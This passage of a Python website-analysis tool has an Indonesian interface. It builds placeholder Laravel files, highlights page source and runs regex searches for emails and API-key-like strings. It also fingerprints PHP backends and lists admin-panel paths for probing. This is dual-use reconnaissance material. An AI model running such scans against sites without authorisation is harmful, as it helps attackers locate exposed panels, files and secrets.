                "laravel-vite-plugin": "^1.0",
                "vite": "^5.0.0"
            },
            "dependencies": {
                "bootstrap": "^5.3.2",
                "jquery": "^3.7.1"
            }
        }
        
        with open(os.path.join(assets_dir, "package.json"), "w") as f:
            json.dump(package_json, f, indent=2)
        
        # webpack.mix.js
        webpack_mix = """
    const mix = require('laravel-mix');

    mix.js('resources/js/app.js', 'public/js')
        .sass('resources/sass/app.scss', 'public/css')
        .version();
    """
        
        with open(os.path.join(assets_dir, "webpack.mix.js"), "w") as f:
            f.write(webpack_mix)
        
        # mix-manifest.json
        mix_manifest = {
            "/js/app.js": "/js/app.js?id=abc123def456",
            "/css/app.css": "/css/app.css?id=789ghi012jkl"
        }
        
        with open(os.path.join(assets_dir, "mix-manifest.json"), "w") as f:
            json.dump(mix_manifest, f, indent=2)
        
        # .env example (dummy version)
        env_content = f"""
    APP_NAME="Laravel {domain}"
    APP_ENV=production
    APP_KEY=base64:abc123def456ghi789jkl012mno345pqr678stu901
    APP_DEBUG=false
    APP_URL=https://{domain}

    DB_CONNECTION=mysql
    DB_HOST=127.0.0.1
    DB_PORT=3306
    DB_DATABASE=laravel_{domain}
    DB_USERNAME=laravel_user
    DB_PASSWORD=secret123

    BROADCAST_DRIVER=log
    CACHE_DRIVER=file
    FILESYSTEM_DISK=local
    QUEUE_CONNECTION=sync
    SESSION_DRIVER=file
    SESSION_LIFETIME=120
    """
        
        with open(os.path.join(assets_dir, ".env.example"), "w") as f:
            f.write(env_content)

    def _create_css_assets(self, assets_dir):
        """Create CSS assets"""
        css_dir = os.path.join(assets_dir, "css")
        os.makedirs(css_dir, exist_ok=True)
        
        # app.css
        app_css = """
    /* Laravel Main Stylesheet */
    :root {
        --primary-color: #3b82f6;
        --secondary-color: #64748b;
        --success-color: #10b981;
        --danger-color: #ef4444;
    }

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        font-family: 'Nunito', sans-serif;
        line-height: 1.6;
        color: #334155;
        background-color: #f8fafc;
    }

    .container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 0 20px;
    }

    .navbar {
        background: #1e293b;
        padding: 1rem 0;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .btn {
        display: inline-block;
        padding: 10px 20px;
        border: none;
        border-radius: 6px;
        cursor: pointer;
        text-decoration: none;
        font-weight: 600;
    }

    .btn-primary {
        background: var(--primary-color);
        color: white;
    }

    .card {
        background: white;
        border-radius: 8px;
        padding: 2rem;
        box-shadow: 0 4px 6px rgba(0,0,0,0.05);
        margin-bottom: 2rem;
    }
    """
        
        with open(os.path.join(css_dir, "app.css"), "w") as f:
            f.write(app_css)
        
        # bootstrap.css (mini version)
        bootstrap_css = """
    /* Bootstrap 5 Customized */
    .alert { padding: 12px; border-radius: 4px; margin: 10px 0; }
    .alert-success { background: #d1fae5; color: #065f46; }
    .alert-danger { background: #fee2e2; color: #991b1b; }
    .form-control { 
        width: 100%; 
        padding: 10px; 
        border: 1px solid #d1d5db; 
        border-radius: 4px; 
        margin: 5px 0; 
    }
    """
        
        with open(os.path.join(css_dir, "bootstrap.css"), "w") as f:
            f.write(bootstrap_css)

    def _create_javascript_assets(self, assets_dir):
        """Create JavaScript assets"""
        js_dir = os.path.join(assets_dir, "js")
        os.makedirs(js_dir, exist_ok=True)
        
        # app.js
        app_js = """
    // Laravel Main JavaScript
    console.log('Laravel app initialized');

    document.addEventListener('DOMContentLoaded', function() {
        // Bootstrap components initialization
        initializeBootstrapComponents();
        
        // AJAX setup for Laravel CSRF
        initializeAjax();
        
        // Form validation
        initializeFormValidation();
    });

    function initializeBootstrapComponents() {
        // Tooltip initialization
        var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
        var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
            return new bootstrap.Tooltip(tooltipTriggerEl);
        });
    }

    function initializeAjax() {
        // CSRF token setup for AJAX requests
        let token = document.head.querySelector('meta[name="csrf-token"]');
        if (token) {
            $.ajaxSetup({
                headers: {
                    'X-CSRF-TOKEN': token.content
                }
            });
        }
    }

    function initializeFormValidation() {
        const forms = document.querySelectorAll('.needs-validation');
        Array.from(forms).forEach(form => {
            form.addEventListener('submit', event => {
                if (!form.checkValidity()) {
                    event.preventDefault();
                    event.stopPropagation();
                }
                form.classList.add('was-validated');
            }, false);
        });
    }

    // Laravel Echo initialization (if available)
    try {
        window.Echo = new Echo({
            broadcaster: 'pusher',
            key: process.env.MIX_PUSHER_APP_KEY,
            cluster: process.env.MIX_PUSHER_APP_CLUSTER,
            forceTLS: true
        });
    } catch (e) {
        console.log('Echo not initialized');
    }
    """
        
        with open(os.path.join(js_dir, "app.js"), "w") as f:
            f.write(app_js)
        
        # bootstrap.js
        bootstrap_js = """
    // Bootstrap JavaScript components
    try {
        window.bootstrap = require('bootstrap');
    } catch (e) {}

    // jQuery and Popper.js for Bootstrap
    try {
        window.$ = window.jQuery = require('jquery');
        window.Popper = require('@popperjs/core');
    } catch (e) {}
    """
        
        with open(os.path.join(js_dir, "bootstrap.js"), "w") as f:
            f.write(bootstrap_js)

    def _create_image_assets(self, assets_dir):
        """Create placeholder image assets"""
        images_dir = os.path.join(assets_dir, "images")
        os.makedirs(images_dir, exist_ok=True)
        
        # Create placeholder image files (empty files with proper extensions)
        image_files = [
            "logo.png",
            "favicon.ico", 
            "header-bg.jpg",
            "user-avatar.jpg",
            "product-1.png",
            "hero-image.webp"
        ]
        
        for img_file in image_files:
            open(os.path.join(images_dir, img_file), 'w').close()

    def _create_laravel_specific_assets(self, assets_dir):
        """Create Laravel-specific directories and files"""
        
        # Create directory structure
        directories = [
            "resources/views",
            "resources/lang",
            "storage/framework",
            "storage/logs", 
            "bootstrap/cache",
            "public/js",
            "public/css",
            "public/images",
            "public/fonts",
            "config",
            "routes"
        ]
        
        for directory in directories:
            os.makedirs(os.path.join(assets_dir, directory), exist_ok=True)
        
        # Create some Laravel-specific files
        artisan_content = "#!/usr/bin/env php\n<?php\n// Laravel Artisan Console\n"
        with open(os.path.join(assets_dir, "artisan"), "w") as f:
            f.write(artisan_content)
        
        # routes/web.php example
        web_routes = """<?php

    use Illuminate\\Support\\Facades\\Route;
    use App\\Http\\Controllers\\HomeController;
    use App\\Http\\Controllers\\UserController;

    Route::get('/', [HomeController::class, 'index'])->name('home');
    Route::get('/dashboard', [HomeController::class, 'dashboard'])->middleware('auth');
    Route::resource('users', UserController::class);
    Route::post('/contact', [HomeController::class, 'contact'])->name('contact.submit');
    """
        
        with open(os.path.join(assets_dir, "routes", "web.php"), "w") as f:
            f.write(web_routes)

    def _display_assets_summary(self, assets_dir):
        """Display summary of created assets"""

        
        asset_count = 0
        asset_types = {}
        
        for root, dirs, files in os.walk(assets_dir):
            for file in files:
                asset_count += 1
                ext = os.path.splitext(file)[1].lower()
                asset_types[ext] = asset_types.get(ext, 0) + 1
        
        self.print_result("Success", f"Total {asset_count} asset dibuat di: {assets_dir}", "success")
        
        print(f"\n{Colors.GREEN}📊 SUMMARY ASSET LARAVEL:{Colors.END}")
        for ext, count in asset_types.items():
            print(f"{Colors.CYAN}• {ext or 'no-ext'}:{Colors.END} {count} file")
        
        print(f"\n{Colors.YELLOW}📁 STRUKTUR DIREKTORI:{Colors.END}")
        for root, dirs, files in os.walk(assets_dir):
            level = root.replace(assets_dir, '').count(os.sep)
            indent = ' ' * 2 * level
            print(f"{Colors.CYAN}{indent}📁 {os.path.basename(root)}/{Colors.END}")
            subindent = ' ' * 2 * (level + 1)
            for file in files[:5]:  # Show first 5 files per directory
                print(f"{subindent}📄 {file}")

    def _download_asset(self, session, asset_url, assets_dir, asset_type):
        """Helper function to download individual assets"""
        try:
            
            response = session.get(asset_url, timeout=10, stream=True)
            if response.status_code == 200:
                # Extract filename from URL
                parsed_url = urlparse(asset_url)
                filename = os.path.basename(parsed_url.path)
                
                if not filename:
                    filename = f"unknown_{asset_type}_{hash(asset_url)}"
                
                # Create subdirectory for asset type
                type_dir = os.path.join(assets_dir, asset_type)
                os.makedirs(type_dir, exist_ok=True)
                
                file_path = os.path.join(type_dir, filename)
                
                with open(file_path, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                
                return True
        except Exception as e:
            pass
        
        return False
                    

    def display_source_with_advanced_syntax_highlighting(self, source_code):
        """
        Display source code with advanced syntax highlighting for HTML, CSS, JavaScript, and PHP
        """
        try:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🎨 ADVANCED SYNTAX HIGHLIGHTING:{Colors.END}")
            print(f"{Colors.CYAN}Menampilkan source code dengan warna yang berbeda untuk:{Colors.END}")
            print(f"  {Colors.YELLOW}•{Colors.END} HTML Tags")
            print(f"  {Colors.BLUE}•{Colors.END} JavaScript")
            print(f"  {Colors.MAGENTA}•{Colors.END} CSS")
            print(f"  {Colors.RED}•{Colors.END} PHP")
            print(f"  {Colors.GREEN}•{Colors.END} Comments")
            print(f"  {Colors.CYAN}•{Colors.END} Attributes")
            

            highlighted = source_code
            

            php_pattern = r'<\?php(.*?)\?>'
            php_matches = re.findall(php_pattern, highlighted, re.DOTALL | re.IGNORECASE)
            for php_code in set(php_matches):
                full_php_tag = f"<?php{php_code}?>"
                
            
                php_vars = re.findall(r'\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*', php_code)
                for var in set(php_vars):
                    colored_var = f"{Colors.RED}{var}{Colors.END}"
                    php_code = php_code.replace(var, colored_var)
                
            
                php_funcs = re.findall(r'function\s+([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)', php_code)
                for func in set(php_funcs):
                    colored_func = f"{Colors.YELLOW}{func}{Colors.END}"
                    php_code = php_code.replace(func, colored_func)
                
             
                php_keywords = ['echo', 'print', 'if', 'else', 'foreach', 'while', 'for', 'return', 'function', 'class']
                for keyword in php_keywords:
                    if keyword in php_code:
                        php_code = re.sub(r'\b' + re.escape(keyword) + r'\b', f"{Colors.BLUE}{keyword}{Colors.END}", php_code)
                
                colored_php = f"{Colors.RED}<?php{Colors.END}{php_code}{Colors.RED}?>{Colors.END}"
                highlighted = highlighted.replace(full_php_tag, colored_php)
            
         
            html_comments = re.findall(r'<!--.*?-->', highlighted, re.DOTALL)
            for comment in set(html_comments):
                colored_comment = f"{Colors.GREEN}{comment}{Colors.END}"
                highlighted = highlighted.replace(comment, colored_comment)
            
       
            css_blocks = re.findall(r'<style[^>]*>(.*?)</style>', highlighted, re.DOTALL | re.IGNORECASE)
            for css_content in css_blocks:
                full_css_block = f"<style>{css_content}</style>"
                
             
                css_properties = re.findall(r'([a-zA-Z-]+)\s*:', css_content)
                for prop in set(css_properties):
                    if len(prop) > 2:  
                        css_content = re.sub(r'\b' + re.escape(prop) + r'\b', f"{Colors.MAGENTA}{prop}{Colors.END}", css_content)
                
         
                css_values = re.findall(r':\s*([^;]+);', css_content)
                for value in css_values:
                    colored_value = f": {Colors.CYAN}{value.strip()}{Colors.END};"
                    css_content = css_content.replace(f": {value};", colored_value)
                
      
                css_selectors = re.findall(r'([.#]?[a-zA-Z][^{]*)\s*{', css_content)
                for selector in set(css_selectors):
                    if selector.strip() and len(selector.strip()) > 1:
                        css_content = re.sub(re.escape(selector), f"{Colors.YELLOW}{selector}{Colors.END}", css_content)
                
                colored_css = f"{Colors.YELLOW}<style>{Colors.END}{css_content}{Colors.YELLOW}</style>{Colors.END}"
                highlighted = highlighted.replace(full_css_block, colored_css)
            
       
            inline_styles = re.findall(r'style="([^"]*)"', highlighted)
            for style in set(inline_styles):
                full_style = f'style="{style}"'
                colored_style = f'style="{Colors.MAGENTA}{style}{Colors.END}"'
                highlighted = highlighted.replace(full_style, colored_style)
        
            js_blocks = re.findall(r'<script[^>]*>(.*?)</script>', highlighted, re.DOTALL | re.IGNORECASE)
            for js_content in js_blocks:
                full_js_block = f"<script>{js_content}</script>"
                
           
                js_functions = re.findall(r'function\s+([a-zA-Z_$][a-zA-Z0-9_$]*)', js_content)
                for func in set(js_functions):
                    js_content = re.sub(r'\b' + re.escape(func) + r'\b', f"{Colors.YELLOW}{func}{Colors.END}", js_content)
                
             
                js_keywords = ['var', 'let', 'const', 'function', 'return', 'if', 'else', 'for', 'while', 'switch', 'case', 'break', 'continue']
                for keyword in js_keywords:
                    js_content = re.sub(r'\b' + re.escape(keyword) + r'\b', f"{Colors.BLUE}{keyword}{Colors.END}", js_content)
                
            
                js_strings = re.findall(r'["\']([^"\']*)["\']', js_content)
                for string in set(js_strings):
                    if len(string) > 0:
                        js_content = js_content.replace(f'"{string}"', f'"{Colors.GREEN}{string}{Colors.END}"')
                        js_content = js_content.replace(f"'{string}'", f"'{Colors.GREEN}{string}{Colors.END}'")
                
           
                js_numbers = re.findall(r'\b\d+\b', js_content)
                for number in set(js_numbers):
                    js_content = re.sub(r'\b' + re.escape(number) + r'\b', f"{Colors.CYAN}{number}{Colors.END}", js_content)
                
                colored_js = f"{Colors.YELLOW}<script>{Colors.END}{js_content}{Colors.YELLOW}</script>{Colors.END}"
                highlighted = highlighted.replace(full_js_block, colored_js)
            
      
            html_tags = re.findall(r'</?[a-zA-Z][^>]*>', highlighted)
            for tag in set(html_tags):
              
                if Colors.YELLOW not in tag and Colors.RED not in tag:
                    colored_tag = f"{Colors.YELLOW}{tag}{Colors.END}"
                    highlighted = highlighted.replace(tag, colored_tag)
            
         
            attributes = re.findall(r'\b([a-zA-Z-]+)="([^"]*)"', highlighted)
            for attr_name, attr_value in attributes:
                full_attr = f'{attr_name}="{attr_value}"'
                # Only color if not already colored
                if Colors.CYAN not in full_attr:
                    colored_attr = f'{Colors.CYAN}{attr_name}{Colors.END}="{Colors.WHITE}{attr_value}{Colors.END}"'
                    highlighted = highlighted.replace(full_attr, colored_attr)
            
      
            meta_tags = re.findall(r'<meta[^>]*>', highlighted)
            for meta_tag in meta_tags:
                colored_meta = f"{Colors.MAGENTA}{meta_tag}{Colors.END}"
                highlighted = highlighted.replace(meta_tag, colored_meta)
            
        
            link_tags = re.findall(r'<a[^>]*>.*?</a>', highlighted, re.DOTALL | re.IGNORECASE)
            for link_tag in link_tags:
                colored_link = f"{Colors.BLUE}{link_tag}{Colors.END}"
                highlighted = highlighted.replace(link_tag, colored_link)
            
     
            form_elements = re.findall(r'<(input|textarea|select|button)[^>]*>', highlighted, re.IGNORECASE)
            for element in set(form_elements):
                element_tags = re.findall(r'<' + re.escape(element) + r'[^>]*>', highlighted, re.IGNORECASE)
                for tag in element_tags:
                    colored_element = f"{Colors.CYAN}{tag}{Colors.END}"
                    highlighted = highlighted.replace(tag, colored_element)
            
       
            lines = highlighted.split('\n')
            total_lines = len(lines)
            
            print(f"\n{Colors.CYAN}📊 Total Lines: {total_lines}{Colors.END}")
            print(f"{Colors.CYAN}🎨 Legend: {Colors.YELLOW}HTML Tags{Colors.END} | {Colors.BLUE}JS Keywords{Colors.END} | {Colors.MAGENTA}CSS{Colors.END} | {Colors.RED}PHP{Colors.END} | {Colors.GREEN}Comments{Colors.END} | {Colors.CYAN}Attributes{Colors.END}")
            print(f"{Colors.WHITE}{'='*100}{Colors.END}")
            
            # Pagination
            current_line = 0
            lines_per_page = 30
            
            while current_line < total_lines:
                end_line = min(current_line + lines_per_page, total_lines)
                
                print(f"\n{Colors.CYAN}--- Lines {current_line + 1}-{end_line} of {total_lines} ---{Colors.END}")
                
                for i in range(current_line, end_line):
                    line_content = lines[i]
                    # Add line number
                    print(f"{Colors.YELLOW}{i+1:4d} │ {Colors.END}{line_content}")
                
                current_line = end_line
                
                if current_line < total_lines:
                    print(f"\n{Colors.CYAN}{'='*100}{Colors.END}")
                    cont = input(f"{Colors.CYAN}↵ Enter untuk lanjut, 's' untuk stop, 'f' untuk cari: {Colors.END}").strip().lower()
                    
                    if cont == 's':
                        break
                    elif cont == 'f':
                        search_term = input(f"{Colors.CYAN}➤ Cari kata kunci: {Colors.END}").strip()
                        if search_term:
                            self.highlight_and_search_in_display(lines, search_term, current_line)
            
            print(f"{Colors.WHITE}{'='*100}{Colors.END}")
            
            # Options after display
            print(f"\n{Colors.GREEN}{Colors.BOLD}📋 OPSI TAMBAHAN:{Colors.END}")
            print(f"{Colors.CYAN}1.{Colors.END} Simpan highlighted code ke file")
            print(f"{Colors.CYAN}2.{Colors.END} Cari pattern spesifik")
            print(f"{Colors.CYAN}3.{Colors.END} Kembali ke menu analisis")
            
            choice = input(f"\n{Colors.CYAN}➤ Pilih opsi [1-3]: {Colors.END}").strip()
            
            if choice == "1":
                self.save_highlighted_code(source_code, highlighted)
            elif choice == "2":
                self.search_specific_patterns(source_code)
            elif choice == "3":
                return
            else:
                print(f"{Colors.RED}Opsi tidak valid!{Colors.END}")
                
        except Exception as e:
            self.print_result("Error", f"Gagal menampilkan dengan syntax highlighting: {str(e)}", "error")

            print(f"{Colors.RED}Detail error: {traceback.format_exc()}{Colors.END}")

    def highlight_and_search_in_display(self, lines, search_term, start_line):
        """
        Search for terms in the currently displayed lines
        """
        try:
            print(f"\n{Colors.GREEN}🔍 Mencari '{search_term}' dari line {start_line + 1}:{Colors.END}")
            
            matches = []
            for i in range(start_line, len(lines)):
                if search_term.lower() in lines[i].lower():
                    matches.append((i + 1, lines[i]))
            
            if matches:
                print(f"{Colors.GREEN}✓ Ditemukan {len(matches)} hasil:{Colors.END}")
                for line_num, line_content in matches[:10]:
                    # Highlight the search term in the line
                    highlighted_line = line_content.replace(
                        search_term, 
                        f"{Colors.RED}{Colors.BOLD}{search_term}{Colors.END}"
                    )
                    print(f"{Colors.YELLOW}{line_num:4d} ▶{Colors.END} {highlighted_line}")
                
                if len(matches) > 10:
                    print(f"{Colors.YELLOW}... dan {len(matches) - 10} hasil lainnya{Colors.END}")
            else:
                print(f"{Colors.RED}✗ Tidak ditemukan '{search_term}' setelah line {start_line}{Colors.END}")
                
        except Exception as e:
            self.print_result("Error", f"Gagal melakukan pencarian: {str(e)}", "error")

    def save_highlighted_code(self, original_source, highlighted_source):
        """
        Save highlighted code to HTML file for better viewing
        """
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"highlighted_source_{timestamp}.html"
            
            # Create HTML file with proper styling
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>Highlighted Source Code</title>
                <style>
                    body {{ font-family: 'Courier New', monospace; background: #1e1e1e; color: #d4d4d4; padding: 20px; }}
                    .line-number {{ color: #6a9955; padding-right: 15px; user-select: none; }}
                    .html-tag {{ color: #569cd6; }}
                    .js-keyword {{ color: #569cd6; }}
                    .css-property {{ color: #9cdcfe; }}
                    .php-code {{ color: #ff6b6b; }}
                    .comment {{ color: #6a9955; }}
                    .attribute {{ color: #9cdcfe; }}
                    .string {{ color: #ce9178; }}
                    .number {{ color: #b5cea8; }}
                    .line {{ margin: 2px 0; }}
                    .container {{ background: #252526; padding: 20px; border-radius: 5px; }}
                    .legend {{ background: #2d2d30; padding: 10px; margin-bottom: 20px; border-radius: 5px; }}
                </style>
            </head>
            <body>
                <div class="legend">
                    <strong>Legend:</strong>
                    <span class="html-tag">HTML Tags</span> | 
                    <span class="js-keyword">JavaScript</span> | 
                    <span class="css-property">CSS</span> | 
                    <span class="php-code">PHP</span> | 
                    <span class="comment">Comments</span> | 
                    <span class="attribute">Attributes</span>
                </div>
                <div class="container">
            """
            
            # Convert highlighted source to HTML
            lines = highlighted_source.split('\n')
            for i, line in enumerate(lines, 1):
                # Convert terminal colors to HTML spans
                html_line = line
                html_line = html_line.replace(Colors.YELLOW, '<span class="html-tag">')
                html_line = html_line.replace(Colors.BLUE, '<span class="js-keyword">')
                html_line = html_line.replace(Colors.MAGENTA, '<span class="css-property">')
                html_line = html_line.replace(Colors.RED, '<span class="php-code">')
                html_line = html_line.replace(Colors.GREEN, '<span class="comment">')
                html_line = html_line.replace(Colors.CYAN, '<span class="attribute">')
                html_line = html_line.replace(Colors.WHITE, '<span class="string">')
                html_line = html_line.replace(Colors.END, '</span>')
                
                html_content += f'<div class="line"><span class="line-number">{i:4d}</span> {html_line}</div>\n'
            
            html_content += """
                </div>
            </body>
            </html>
            """
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.print_result("Success", f"Highlighted code disimpan sebagai: {filename}", "success")
            print(f"{Colors.CYAN}➤ Buka file di browser untuk melihat dengan warna yang proper{Colors.END}")
            
        except Exception as e:
            self.print_result("Error", f"Gagal menyimpan highlighted code: {str(e)}", "error")

    def search_specific_patterns(self, source_code):
        """
        Search for specific patterns in source code
        """
        try:
            print(f"\n{Colors.GREEN}{Colors.BOLD}🔍 PENCARIAN PATTERN SPESIFIK:{Colors.END}")
            
            patterns = {
                "1": ("Email Addresses", r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'),
                "2": ("URLs", r'https?://[^\s<>"]+|www\.[^\s<>"]+'),
                "3": ("IP Addresses", r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'),
                "4": ("Phone Numbers", r'\+?[\d\s\-()]{10,}'),
                "5": ("API Keys", r'[a-zA-Z0-9]{32,}'),
                "6": ("JavaScript Functions", r'function\s+([a-zA-Z_$][a-zA-Z0-9_$]*)'),
                "7": ("CSS Classes", r'class="([^"]*)"'),
                "8": ("HTML IDs", r'id="([^"]*)"'),
                "9": ("Custom Regex", "")
            }
            
            print(f"{Colors.CYAN}Pilih pattern yang ingin dicari:{Colors.END}")
            for key, (name, _) in patterns.items():
                print(f"  {Colors.CYAN}{key}.{Colors.END} {name}")
            
            choice = input(f"\n{Colors.CYAN}➤ Pilih pattern [1-9]: {Colors.END}").strip()
            
            if choice == "9":
                custom_pattern = input(f"{Colors.CYAN}➤ Masukkan custom regex pattern: {Colors.END}").strip()
                if custom_pattern:
                    pattern_name = "Custom Pattern"
                    pattern_regex = custom_pattern
                else:
                    self.print_result("Error", "Pattern tidak boleh kosong!", "error")
                    return
            elif choice in patterns:
                pattern_name, pattern_regex = patterns[choice]
            else:
                self.print_result("Error", "Pilihan tidak valid!", "error")
                return

            matches = re.findall(pattern_regex, source_code, re.IGNORECASE)
            
            if matches:
                unique_matches = list(set(matches))
                print(f"\n{Colors.GREEN}✓ {pattern_name}: Ditemukan {len(unique_matches)} unique matches{Colors.END}")
                
                for match in unique_matches[:20]:
                    print(f"  {Colors.CYAN}•{Colors.END} {match}")
                
                if len(unique_matches) > 20:
                    print(f"  {Colors.YELLOW}... dan {len(unique_matches) - 20} lainnya{Colors.END}")
            else:
                print(f"\n{Colors.RED}✗ {pattern_name}: Tidak ditemukan matches{Colors.END}")
                
        except Exception as e:
            self.print_result("Error", f"Gagal mencari pattern: {str(e)}", "error")

    def backend_php_analysis(self):
        """
        Specialized analysis for backend and PHP detection with enhanced UI
        """
        try:
            # Clear screen and show header
            self.clear_screen()
            print(f"\n{Colors.CYAN}{Colors.BOLD}" + "="*60 + Colors.END)
            print(f"{Colors.CYAN}{Colors.BOLD}           BACKEND & PHP ANALYSIS TOOL{Colors.END}")
            print(f"{Colors.CYAN}{Colors.BOLD}" + "="*60 + Colors.END)
            
            # URL input with validation
            while True:
                print(f"\n{Colors.CYAN}📝 URL INPUT{Colors.END}")
                url = input(f"{Colors.CYAN}➤ Masukkan URL website: {Colors.END}").strip()
                
                if not url:
                    self.print_result("Error", "URL tidak boleh kosong!", "error")
                    continue
                
                if not url.startswith(('http://', 'https://')):
                    url = 'https://' + url
                
                # Validate URL format
                if self.validate_url(url):
                    break
                else:
                    self.print_result("Error", "Format URL tidak valid!", "error")
            
            # Analysis options
            print(f"\n{Colors.CYAN}⚙️  OPSI ANALISIS{Colors.END}")
            print(f"{Colors.CYAN}1. Analisis PHP Dasar{Colors.END}")
            print(f"{Colors.CYAN}2. Analisis Komprehensif + Probing File{Colors.END}")
            print(f"{Colors.CYAN}3. Analisis Lengkap + SQL Preview{Colors.END}")
            
            choice = input(f"\n{Colors.CYAN}➤ Pilih opsi analisis (1-3): {Colors.END}").strip()
            
            # Show loading animation
            self.show_loading("Memulai analisis backend...")
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(url, headers=headers, timeout=15, verify=False)
            response.raise_for_status()
            
            source_code = response.text
            
            # Execute analysis based on choice
            if choice == '1':
                self.analyze_php_indicators_ui(source_code, response.headers, url)
            elif choice == '2':
                self.analyze_php_indicators_ui(source_code, response.headers, url)
                self.comprehensive_backend_detection_ui(source_code, response.headers, url)
                self.probe_backend_files_ui(url)
            else:  # Default to comprehensive analysis
                self.analyze_php_indicators_ui(source_code, response.headers, url)
                self.comprehensive_backend_detection_ui(source_code, response.headers, url)
                self.probe_backend_files_ui(url)
                self.database_analysis_ui(source_code, url)
            
            # Generate report
            self.generate_backend_report(url, source_code, response.headers)
            
        except requests.exceptions.RequestException as e:
            self.print_result("Error", f"Gagal mengakses URL: {str(e)}", "error")
        except Exception as e:
            self.print_result("Error", f"Terjadi kesalahan: {str(e)}", "error")
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk kembali ke menu...{Colors.END}")

    def analyze_php_indicators_ui(self, source_code, headers, url):
        """
        Enhanced PHP analysis with better UI
        """
        print(f"\n{Colors.GREEN}{Colors.BOLD}🐘 PHP ANALYSIS DASHBOARD{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}" + "─" * 50 + Colors.END)
        
        php_indicators = {
            '📄 File Extensions': ['.php', '.php3', '.php4', '.php5', '.phtml'],
            '🏷️  PHP Tags': ['<?php', '<?=', '<?', '?>'],
            '⚡ PHP Functions': ['$_GET', '$_POST', '$_REQUEST', '$_SESSION', '$_COOKIE'],
            '🎯 WordPress': ['wp-content', 'wp-includes', 'wp-admin', 'wordpress'],
            '🚀 Laravel': ['laravel', 'illuminate', 'blade', 'artisan'],
            '🔥 CodeIgniter': ['codeigniter', 'ci_session'],
            '🎭 Symfony': ['symfony', 'sf-'],
            '📁 Common PHP Files': ['index.php', 'admin.php', 'login.php', 'config.php'],
        }
        
        # Create results table
        table_data = []
        total_detections = 0
        
        for category, indicators in php_indicators.items():
            found_count = 0
            found_items = []
            
            for indicator in indicators:
                count = source_code.lower().count(indicator.lower())
                if count > 0:
                    found_count += count
                    found_items.append(f"{indicator}({count})")
            
            if found_count > 0:
                total_detections += found_count
                status = f"{Colors.GREEN}✓ DETECTED{Colors.END}"
                table_data.append([category, len(found_items), found_count, status])
            else:
                table_data.append([category, 0, 0, f"{Colors.RED}✗ NOT FOUND{Colors.END}"])
        
        # Display table
        headers_table = ["Category", "Patterns", "Total", "Status"]
        print(tabulate(table_data, headers=headers_table, tablefmt="grid"))
        
        # Summary
        print(f"\n{Colors.CYAN}📊 SUMMARY:{Colors.END}")
        print(f"  Total Detections: {Colors.GREEN}{total_detections}{Colors.END}")
        print(f"  PHP Confidence: {Colors.GREEN}{min(100, total_detections * 5)}%{Colors.END}")
        
        # PHP Errors detection
        self.detect_php_errors_ui(source_code)

    def detect_php_errors_ui(self, source_code):
        """
        Enhanced PHP error detection with UI
        """
        php_errors = {
            '🚨 FATAL ERROR': ['fatal error', 'parse error'],
            '⚠️  WARNING': ['warning:', 'undefined variable', 'undefined index'],
            '💡 NOTICE': ['notice:', 'deprecated', 'strict standards']
        }
        
        error_table = []
        
        for error_type, patterns in php_errors.items():
            for pattern in patterns:
                count = source_code.lower().count(pattern.lower())
                if count > 0:
                    error_table.append([error_type, pattern, count, f"{Colors.RED}DANGER{Colors.END}"])
        
        if error_table:
            print(f"\n{Colors.RED}{Colors.BOLD}🚨 PHP ERRORS DETECTED:{Colors.END}")
            print(tabulate(error_table, headers=["Type", "Pattern", "Count", "Level"], tablefmt="grid"))
        else:
            print(f"\n{Colors.GREEN}✅ No PHP errors detected{Colors.END}")

    def comprehensive_backend_detection_ui(self, source_code, headers, url):
        """
        Enhanced backend detection with UI
        """
        print(f"\n{Colors.BLUE}{Colors.BOLD}🔍 BACKEND TECHNOLOGY DASHBOARD{Colors.END}")
        print(f"{Colors.BLUE}{Colors.BOLD}" + "─" * 50 + Colors.END)
        
        backend_indicators = {
            '🗄️  Database': [
                'mysql_connect', 'mysqli_connect', 'pg_connect', 'sqlite_connect',
                'new PDO', 'mysql_query', 'SELECT * FROM', 'INSERT INTO'
            ],
            '🛠️  Frameworks': [
                'django', 'flask', 'spring', 'ruby on rails', 'express.js',
                'laravel', 'symfony', 'codeigniter', 'yii', 'cakephp'
            ],
            '🔗 API Endpoints': [
                '/api/', '/graphql', '/rest/', '/json/', 'ajax',
                'fetch(', 'axios.', 'XMLHttpRequest'
            ],
            '🔐 Authentication': [
                'login', 'logout', 'register', 'signin', 'signout',
                'auth', 'authentication', 'jwt', 'oauth', 'bearer'
            ],
            '⚙️  Admin Panels': [
                '/admin/', '/administrator/', '/wp-admin/', '/cpanel/',
                '/webmail/', '/phpmyadmin/', '/manager/'
            ],
        }
        
        backend_table = []
        
        for category, indicators in backend_indicators.items():
            detected_patterns = []
            total_count = 0
            
            for indicator in indicators:
                count = source_code.lower().count(indicator.lower())
                if count > 0:
                    detected_patterns.append(indicator)
                    total_count += count
            
            if detected_patterns:
                confidence = min(100, len(detected_patterns) * 15)
                backend_table.append([
                    category, 
                    len(detected_patterns), 
                    total_count,
                    f"{Colors.GREEN}{confidence}%{Colors.END}"
                ])
        
        if backend_table:
            print(tabulate(backend_table, headers=["Technology", "Patterns", "Total", "Confidence"], tablefmt="grid"))
        else:
            print(f"{Colors.YELLOW}⚠️  No clear backend technology detected{Colors.END}")

    def probe_backend_files_ui(self, base_url):
        """
